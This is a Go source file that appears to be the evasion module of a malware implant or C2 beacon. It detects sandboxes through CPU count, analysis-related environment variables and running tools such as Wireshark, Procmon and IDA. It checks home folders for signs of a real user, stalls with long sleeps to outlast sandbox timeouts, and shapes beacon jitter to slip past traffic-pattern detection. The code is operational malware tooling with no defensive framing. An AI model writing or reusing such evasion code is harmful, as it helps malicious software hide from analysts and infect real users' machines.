package main

import (
	"math/rand"
	"os"
	"runtime"
	"strings"
	"time"
)

// initEvasion performs pre-execution environment validation and
// platform-specific evasion setup
func initEvasion() {
	// Phase 1: Sandbox/analysis environment detection
	if isSandbox() {
		// Sleep long enough to exhaust sandbox timeout (typically 2-5 min)
		time.Sleep(time.Duration(180+rand.Intn(120)) * time.Second)
	}

	// Phase 2: Verify realistic user environment
	if !hasUserArtifacts() {
		time.Sleep(time.Duration(60+rand.Intn(60)) * time.Second)
	}
}

// isSandbox checks multiple indicators of sandbox/analysis environments
func isSandbox() bool {
	score := 0

	// CPU count — sandboxes typically have 1-2 cores
	if runtime.NumCPU() < 2 {
		score += 25
	}

	// Suspicious environment variables
	for _, env := range []string{"SANDBOX", "MALWARE", "VIRUS", "SAMPLE",
		"CUCKOO", "ANALYSIS", "INETSIM", "FAKENET"} {
		if os.Getenv(env) != "" {
			score += 30
		}
	}

	// Check for common analysis tool processes (Windows)
	if runtime.GOOS == "windows" {
		suspiciousProcs := []string{
			"wireshark", "procmon", "x64dbg", "x32dbg", "ollydbg",
			"ida", "ida64", "pestudio", "processhacker", "fiddler",
			"charles", "apimonitor", "tcpdump", "dumpcap",
		}
		// Read tasklist without spawning visible cmd
		out, err := runCommand("cmd", "/C", "tasklist /FO CSV /NH")
		if err == nil {
			lower := strings.ToLower(string(out))
			for _, proc := range suspiciousProcs {
				if strings.Contains(lower, proc) {
					score += 20
					break
				}
			}
		}
	}

	// Low process count indicates sandbox
	if runtime.GOOS == "windows" {
		out, _ := runCommand("cmd", "/C", "tasklist /NH")
		procCount := strings.Count(string(out), "\n")
		if procCount < 30 {
			score += 20
		}
	}

	return score >= 40
}

// hasUserArtifacts checks for signs of a real user environment
func hasUserArtifacts() bool {
	home := os.Getenv("USERPROFILE")
	if home == "" {
		home = os.Getenv("HOME")
	}
	if home == "" {
		return true // Can't check, assume real
	}

	artifacts := 0
	for _, dir := range []string{"Desktop", "Documents", "Downloads", "Pictures"} {
		path := home + string(os.PathSeparator) + dir
		entries, err := os.ReadDir(path)
		if err == nil {
			artifacts += len(entries)
		}
	}

	// Real users have at least some files in their profile
	return artifacts >= 5
}

// randomizeBeaconTiming adds realistic jitter to beacon intervals
// to avoid pattern-based detection (Jitter-Trap, statistical analysis)
// Instead of uniform jitter, uses a distribution that mimics real
// application polling patterns (human-driven activity bursts)
func randomizeBeaconTiming(baseSeconds int, jitterPercent int) time.Duration {
	if jitterPercent <= 0 || jitterPercent > 100 {
		return time.Duration(baseSeconds) * time.Second
	}

	jitterRange := float64(baseSeconds) * float64(jitterPercent) / 100.0

	// Use non-uniform distribution: sometimes short bursts, sometimes long gaps
	// This mimics real human browsing patterns better than uniform random
	r := rand.Float64()
	var sleepSec float64
	if r < 0.3 {
		// 30% chance: shorter than average (active browsing)
		sleepSec = float64(baseSeconds) - jitterRange + rand.Float64()*jitterRange*0.5
	} else if r < 0.9 {
		// 60% chance: around average
		sleepSec = float64(baseSeconds) - jitterRange*0.3 + rand.Float64()*jitterRange*0.6
	} else {
		// 10% chance: longer than average (user stepped away)
		sleepSec = float64(baseSeconds) + rand.Float64()*jitterRange
	}

	if sleepSec < 1 {
		sleepSec = 1
	}

	return time.Duration(sleepSec*1000) * time.Millisecond
}
